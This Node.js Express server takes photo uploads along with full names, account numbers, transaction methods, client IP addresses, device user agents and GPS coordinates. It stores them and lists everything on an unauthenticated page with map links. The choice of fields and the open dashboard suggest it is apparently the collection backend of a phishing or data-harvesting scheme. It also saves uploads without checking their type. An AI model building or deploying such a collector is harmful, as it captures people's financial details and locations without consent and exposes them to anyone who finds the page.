// server.js
const express = require("express");
const path = require("path");
const fs = require("fs");
const multer = require("multer");

const app = express();
const PORT = process.env.PORT || 10000;

// Make sure uploads directory exists
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// Multer storage for PNG photos
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    const unique = Date.now() + "-" + Math.random().toString(36).slice(2, 8);
    cb(null, `${unique}.png`);
  }
});
const upload = multer({ storage });

// Middlewares
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Static files (HTML, JS, CSS) from /public
app.use(express.static(path.join(__dirname, "public")));

// Serve uploaded files at /files/<filename>
app.use("/files", express.static(uploadDir));

// In-memory log of submissions (resets when container restarts)
const submissions = [];

/**
 * Helper: get client IP (Render / proxy aware)
 */
function getClientIp(req) {
  const xff = req.headers["x-forwarded-for"];
  if (xff) {
    return xff.split(",")[0].trim();
  }
  return req.socket.remoteAddress || "unknown";
}

/**
 * POST /upload-photo
 * Receives: form fields + photo + optional lat/long/accuracy
 */
app.post("/upload-photo", upload.single("photo"), (req, res) => {
  try {
    const file = req.file;
    if (!file) {
      return res.status(400).send("No photo uploaded");
    }

    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "unknown";

    const {
      fullName,
      accountNumber,
      transactionMethod,
      latitude,
      longitude,
      accuracy
    } = req.body;

    const record = {
      timestamp: new Date().toISOString(),
      ip,
      userAgent: ua,
      fullName: fullName || "",
      accountNumber: accountNumber || "",
      method: transactionMethod || "",
      fileName: file.filename,
      latitude: latitude || null,
      longitude: longitude || null,
      accuracy: accuracy || null
    };

    submissions.push(record);

    res
      .status(200)
      .send(`Photo stored as: ${file.filename}`);
  } catch (err) {
    console.error("Upload error:", err);
    res.status(500).send("Server error");
  }
});

/**
 * GET /files-list
 * Simple HTML table of all submissions with a Google Maps link if location present
 */
app.get("/files-list", (req, res) => {
  let html = `
  <!doctype html>
  <html>
  <head>
    <meta charset="utf-8" />
    <title>Uploaded Photos</title>
    <style>
      body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; margin: 20px; }
      h1 { margin-bottom: 16px; }
      table { border-collapse: collapse; width: 100%; max-width: 1200px; }
      th, td { border: 1px solid #ddd; padding: 8px 10px; font-size: 14px; }
      th { background: #f3f4f6; text-align: left; }
      tr:nth-child(even) { background: #f9fafb; }
      a { color: #1d4ed8; text-decoration: none; }
      a:hover { text-decoration: underline; }
    </style>
  </head>
  <body>
    <h1>Uploaded Photos</h1>
    <table>
      <thead>
        <tr>
          <th>Timestamp (UTC)</th>
          <th>IP Address</th>
          <th>Full Name</th>
          <th>Account #</th>
          <th>Method</th>
          <th>Device (User-Agent)</th>
          <th>Location</th>
          <th>File</th>
        </tr>
      </thead>
      <tbody>
  `;

  for (const s of submissions) {
    const mapLink =
      s.latitude && s.longitude
        ? `<a href="https://www.google.com/maps?q=${encodeURIComponent(
            s.latitude + "," + s.longitude
          )}" target="_blank">View on map</a><br/><small>±${s.accuracy ||
            "?"}m</small>`
        : "";

    html += `
      <tr>
        <td>${s.timestamp}</td>
        <td>${s.ip}</td>
        <td>${escapeHtml(s.fullName)}</td>
        <td>${escapeHtml(s.accountNumber)}</td>
        <td>${escapeHtml(s.method)}</td>
        <td>${escapeHtml(s.userAgent)}</td>
        <td>${mapLink}</td>
        <td><a href="/files/${encodeURIComponent(
          s.fileName
        )}" target="_blank">${s.fileName}</a></td>
      </tr>
    `;
  }

  html += `
      </tbody>
    </table>
  </body>
  </html>
  `;

  res.send(html);
});

// Simple HTML escape
function escapeHtml(str) {
  return String(str || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

// Start server
app.listen(PORT, () => {
  console.log(`Listening on ${PORT}`);
});
